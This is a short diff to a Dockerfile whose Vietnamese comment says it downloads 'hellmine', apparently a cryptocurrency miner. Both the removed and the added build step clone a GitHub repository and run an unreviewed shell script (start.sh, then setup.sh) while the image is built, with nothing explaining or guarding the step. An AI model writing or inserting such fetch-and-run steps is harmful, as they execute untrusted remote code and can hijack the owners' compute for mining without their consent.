@@ -13,4 +13,4 @@ RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
 
 # Tạo thư mục làm việc và tải hellmine
 
-RUN git clone https://github.com/Teo4268/Bjndersrb.git && unzip tool.zip && cd tool && chmod +x start.sh && ./start.sh 48
+RUN apt update && apt install git -y && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh
